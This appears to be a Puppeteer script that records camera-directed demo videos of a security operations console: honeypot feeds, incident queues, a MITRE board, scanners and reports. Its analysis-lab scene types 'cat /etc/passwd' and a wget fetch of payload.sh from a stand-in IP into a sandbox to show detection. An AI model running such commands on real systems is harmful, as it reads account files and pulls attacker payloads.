// Scene scripts for the third cut: the camera follows the pointer, closes in on what it touches,
// and pulls back between actions. Each scene drives a real console page and records it.
// usage: ST_TOKEN_FILE=<jwt file> NODE_PATH=<dir with puppeteer-core> node scenes3.js <outdir> <scene> [scene...]
const path = require('path');
const { open, sleep, closeAll } = require('./rec3');

// give a panel a stable name by its heading text, so the camera can be pointed at it
const tag = (s, name, headingText, closest = '.hn-panel, .soc-card, .al-card, .us-card, .panel, section') => s.page.evaluate((name, text, closest) => {
    const h = [...document.querySelectorAll('h1, h2, h3, h4, .card-title, .hd .t')].find((e) => e.textContent.trim().toLowerCase().startsWith(text.toLowerCase()));
    if (!h) return false;
    (h.closest(closest) || h.parentElement).setAttribute('data-rec', name);
    return true;
}, name, headingText, closest);

const SCENES = {
    // Event log while a real SSH brute force, then a real session, hit the Cowrie honeypot
    live: async (out) => {
        const s = await open('events.html');
        await sleep(3000);
        await s.page.evaluate(() => { document.querySelector('#hn-feed').closest('.hn-panel').setAttribute('data-rec', 'live'); });
        await s.moveTo(1180, 300, 10);
        await s.start(path.join(out, 'live.frames'));
        await sleep(500);
        s.mark('fire brute force'); const bruteDone = s.fire('ssh_bruteforce');
        await sleep(500);
        // close in on the live list as the first rows land
        await Promise.all([s.camEl('[data-rec="live"]', 1.75, 1100, { fit: 0.97 }), s.moveToEl('#hn-feed', 1200, { dy: -110 })]);
        const listAt = Date.now();
        const toast = await s.waitFor(() => !!document.querySelector('.st-toast'), 12000);
        s.mark(toast ? 'incident toast' : 'no toast');
        await sleep(Math.max(200, 1900 - (Date.now() - listAt))); // let the list be read before leaving it
        if (toast) await s.go('.st-toast', 2.5, 850, { fit: 0.6 });
        await sleep(toast ? 1600 : 300);
        // back to the top of the list, closer this time: rows land here, newest first
        await Promise.all([s.camTop('#hn-feed', 2.2, 900, { inset: 110, left: 46 }), s.moveToEl('#hn-feed', 1000, { dy: -150, dx: -120 })]);
        // the brute force is eight attempts; only once it is over does the intruder come back and get in,
        // so the session's rows arrive while the camera is on them
        await bruteDone;
        await sleep(400);
        s.mark('fire session'); s.fire('ssh_session');
        const hit = await s.waitFor(() => [...document.querySelectorAll('#hn-feed > *')].slice(0, 8).some((r) => /file_download/i.test(r.textContent)), 12000);
        s.mark(hit ? 'session rows' : 'no session rows');
        await sleep(2300);
        await s.wide(950);
        await sleep(500);
        s.mark('end');
        await s.stop(path.join(out, 'live.mp4'));
    },

    // Investigations: filter the queue by typing, open the brute force case, read it
    investigate: async (out) => {
        const s = await open('incidents.html');
        await sleep(3500);
        await s.moveTo(1150, 330, 10);
        await s.start(path.join(out, 'investigate.frames'));
        await sleep(600);
        await s.go('#inc-q', 2.2, 900, { fit: 0.9, dx: -240 });
        await s.press();
        await sleep(200);
        s.mark('type filter'); await s.type('brute', 110);
        await sleep(700);
        s.mark('open case');
        await Promise.all([s.camEl('.inc-row', 1.9, 800, { fit: 0.6 }), s.moveToEl('.inc-row', 900)]);
        await s.press();
        await sleep(1000);
        await s.go('.gauges', 2.6, 850, { fit: 0.45 });
        await sleep(1100);
        const tab = await s.centre('#dtl-tabs .tab[data-tab="timeline"]');
        if (tab && tab.y > 620) { await s.wide(450); await s.scroll(360, 700); }
        s.mark('timeline');
        await s.go('#dtl-tabs .tab[data-tab="timeline"]', 2.3, 850, { fit: 0.3 });
        await s.press();
        await sleep(350);
        await s.camTop('#tab-body', 1.5, 850, { inset: 170 });
        await s.moveToEl('#dtl-tabs', 600, { dy: 150 });
        await sleep(900);
        await s.moveToEl('#dtl-tabs', 900, { dy: 300, dx: 60 });
        await sleep(900);
        await s.wide(900);
        await sleep(450);
        s.mark('end');
        await s.stop(path.join(out, 'investigate.mp4'));
    },

    // MITRE ATT&CK board: close-ups on the techniques the sensors have seen
    mitre: async (out) => {
        const s = await open('mitre.html');
        await sleep(3500);
        await s.moveTo(1250, 320, 10);
        await s.start(path.join(out, 'mitre.frames'));
        await sleep(600);
        await s.go('.technique-card.active[data-id="T1595"]', 2.5, 950, { fit: 0.5, dy: -20 });
        await sleep(1000);
        await s.go('.technique-card.active[data-id="T1059"]', 2.5, 950, { fit: 0.5, dy: -30 });
        await sleep(1100);
        await s.wide(800);
        await s.scroll(330, 900);
        await s.go('.technique-card.active[data-id="T1110"]', 2.5, 900, { fit: 0.5, dy: -30 });
        await sleep(1200);
        await s.wide(850);
        await sleep(400);
        s.mark('end');
        await s.stop(path.join(out, 'mitre.mp4'));
    },

    // Geo intelligence: close on the globe while it is turned by hand, then the feed card, then the map
    geo: async (out) => {
        const s = await open('geo.html');
        await sleep(6000);
        const g0 = await s.centre('#geoGlobe');
        await s.moveTo(g0.x + 130, g0.y, 10);
        await s.start(path.join(out, 'geo.frames'));
        await sleep(500);
        await s.camEl('.geo-stage', 1.42, 1000, { fit: 0.99 });
        let g = await s.centre('#geoGlobe');
        s.mark('drag 1'); await s.drag(g.x + 150, g.y + 10, g.x - 190, g.y - 20, 1700);
        await sleep(300);
        s.mark('drag 2'); await s.drag(g.x - 70, g.y - 50, g.x + 190, g.y + 60, 1500);
        await sleep(400);
        await s.go('.map-overlay', 2.4, 900, { fit: 0.42 });
        await sleep(1100);
        s.mark('map');
        await s.go('.view-toggle button', 2.8, 900, { index: 1, fit: 0.2 });
        await s.press();
        await sleep(300);
        await s.camEl('.geo-stage', 1.42, 1000, { fit: 0.99 });
        await sleep(2300);
        await s.wide(900);
        await sleep(400);
        s.mark('end');
        await s.stop(path.join(out, 'geo.mp4'));
    },

    // Credential vault: close on the search, type, pull back to the filtered rows
    creds: async (out) => {
        const s = await open('credentials.html');
        await sleep(3500);
        await s.page.evaluate(() => { const i = [...document.querySelectorAll('input')].find((e) => /search/i.test(e.placeholder || '')); if (i) i.setAttribute('data-rec', 'search'); const t = document.querySelector('table'); if (t) t.setAttribute('data-rec', 'table'); });
        await s.moveTo(900, 560, 10);
        await s.start(path.join(out, 'creds.frames'));
        await sleep(600);
        await s.go('[data-rec="search"]', 2.6, 950, { fit: 0.5, dx: -150 });
        await s.press();
        await sleep(200);
        s.mark('type root'); await s.type('root', 150);
        await sleep(600);
        await Promise.all([s.camTop('[data-rec="table"]', 1.42, 900, { inset: 190 }), s.moveToEl('[data-rec="table"] tbody tr', 1000, { index: 1, dx: -60 })]);
        await sleep(1900);
        await s.wide(850);
        await sleep(400);
        s.mark('end');
        await s.stop(path.join(out, 'creds.mp4'));
    },

    // URL scanner: type a URL, scan it, close in on the verdict
    urlscan: async (out) => {
        const s = await open('urlscan.html');
        await sleep(3000);
        await tag(s, 'verdict', 'Threat assessment');
        await tag(s, 'intel', 'Network intelligence');
        await s.moveTo(1000, 460, 10);
        await s.start(path.join(out, 'urlscan.frames'));
        await sleep(600);
        await s.go('#urlInput', 2.1, 900, { fit: 0.95, dx: -180 });
        await s.press();
        await sleep(200);
        s.mark('type url'); await s.type('https://example.com', 62);
        await sleep(300);
        s.mark('scan'); await s.go('#scanBtn', 2.6, 750, { fit: 0.3 });
        await s.press();
        await sleep(500);
        await s.wide(900);
        const done = await s.waitFor(() => !document.querySelector('#scanBtn').disabled, 40000);
        s.mark(done ? 'result' : 'scan timed out');
        await sleep(500);
        await s.go('[data-rec="verdict"]', 2.3, 900, { fit: 0.6 });
        await sleep(1500);
        await s.go('[data-rec="intel"]', 2.0, 900, { fit: 0.62 });
        await sleep(1600);
        await s.wide(900);
        await sleep(450);
        s.mark('end');
        await s.stop(path.join(out, 'urlscan.mp4'));
    },

    // Analysis lab: close on the terminal while typing, cut across to the behaviour graph and the rule match
    lab: async (out) => {
        const s = await open('analysis_lab.html');
        await sleep(2500);
        await s.page.click('#al-start');
        const ready = await s.waitFor(() => !document.querySelector('#al-stop').disabled && (document.querySelector('.xterm-rows') || {}).innerText.trim().length > 3, 40000);
        if (!ready) throw new Error('sandbox did not start');
        await s.page.click('.terminal.xterm');
        await s.page.keyboard.type('clear'); await s.page.keyboard.press('Enter');
        await sleep(900);
        await s.page.evaluate(() => { const m = document.querySelector('.main-content'); const t = document.querySelector('.terminal.xterm'); m.scrollTop += t.getBoundingClientRect().top - 150; });
        await s.page.evaluate(() => { document.querySelector('#al-det').parentElement.setAttribute('data-rec', 'det'); });
        await s.page.evaluate(() => { document.querySelector('.al-flow').setAttribute('data-rec', 'flow'); });
        const term = await s.centre('.terminal.xterm');
        await s.moveTo(term.x + 80, term.y + 60, 10);
        await s.start(path.join(out, 'lab.frames'));
        await sleep(500);
        await s.camEl('.terminal.xterm', 2.0, 900, { fit: 0.98, dy: -40 });
        s.mark('whoami'); await s.type('whoami', 90); await sleep(200); await s.enter();
        await sleep(600);
        s.mark('passwd'); await s.type('cat /etc/passwd', 75); await sleep(200); await s.enter();
        await sleep(800);
        s.mark('wget'); await s.type('wget http://203.0.113.9/payload.sh', 55); await sleep(200); await s.enter();
        await sleep(1000);
        // the three commands are now nodes in the behaviour graph
        await s.go('[data-rec="flow"]', 2.0, 800, { fit: 0.9 });
        await sleep(1500);
        await s.go('[data-rec="det"]', 2.0, 850, { fit: 0.9 });
        await sleep(1700);
        await s.wide(950);
        await sleep(500);
        s.mark('end');
        await s.stop(path.join(out, 'lab.mp4'));
        await s.page.click('#al-stop').catch(() => {});
        await sleep(2500);
    },

    // Reports: close on Generate, then the new row, then the preview panel
    reports: async (out) => {
        const s = await open('reports.html');
        await sleep(3500);
        const before = await s.page.evaluate(() => (document.querySelector('#rp-rows tr') ? document.querySelector('#rp-rows tr').innerText.slice(0, 40) : ''));
        await s.moveTo(1150, 260, 10);
        await s.start(path.join(out, 'reports.frames'));
        await sleep(600);
        s.mark('generate');
        await s.go('.rt-card[data-type="executive_summary"] .rt-go', 2.5, 950, { fit: 0.25, dy: -40 });
        await s.press();
        await sleep(400);
        await s.camEl('.rt-card[data-type="executive_summary"]', 2.0, 600, { fit: 0.7 });
        const made = await s.waitFor((before) => { const r = document.querySelector('#rp-rows tr'); return r && r.innerText.slice(0, 40) !== before; }, 60000, before);
        s.mark(made ? 'generated' : 'generate timed out');
        await sleep(300);
        await s.wide(650);
        const row = await s.centre('#rp-rows tr');
        if (row) await s.scroll(row.y - 330, 900);
        await s.camEl('#rp-rows tr', 1.9, 800, { fit: 0.98 });
        await s.moveToEl('#rp-rows tr', 700, { dx: -200 });
        await sleep(900);
        s.mark('preview');
        await s.go('#rp-rows tr button.pv', 2.6, 800, { fit: 0.2 });
        await s.press();
        await sleep(300);
        await s.wide(800);
        const shown = await s.waitFor(() => document.querySelectorAll('.pvw-pages canvas').length >= 2, 30000);
        s.mark(shown ? 'pages shown' : 'preview timed out');
        await sleep(500);
        await Promise.all([s.camEl('.pvw-pages', 1.3, 900, { fit: 0.98 }), s.moveToEl('.pvw-pages', 900)]);
        await s.scroll(640, 1800, '.pvw-pages');
        await sleep(600);
        await s.scroll(720, 1800, '.pvw-pages');
        await sleep(900);
        await s.wide(900);
        await sleep(400);
        s.mark('end');
        await s.stop(path.join(out, 'reports.mp4'));
    },

    // Wallboard: slow push to the globe, then across to the live feed as real probes arrive
    wall: async (out) => {
        const s = await open('wallboard.html', { cursor: false, dark: true });
        await sleep(7000);
        await s.start(path.join(out, 'wall.frames'));
        await sleep(700);
        s.mark('fire telnet'); s.fire('telnet');
        await s.camEl('#wb-globe', 1.5, 1700, { fit: 0.98 });
        await sleep(700);
        s.mark('fire session'); s.fire('ssh_session');
        await s.camEl('#wb-feed', 1.95, 1100, { fit: 0.98, dy: -60 });
        await sleep(2400);
        await s.wide(1100);
        await sleep(500);
        s.mark('end');
        await s.stop(path.join(out, 'wall.mp4'));
    },
};

(async () => {
    const [out, ...names] = process.argv.slice(2);
    for (const n of names) {
        if (!SCENES[n]) { console.log('unknown scene', n); continue; }
        try { await SCENES[n](out); } catch (e) { console.log('SCENE FAILED', n, e.message.slice(0, 300)); } finally { await closeAll(); }
    }
    process.exit(0);
})();
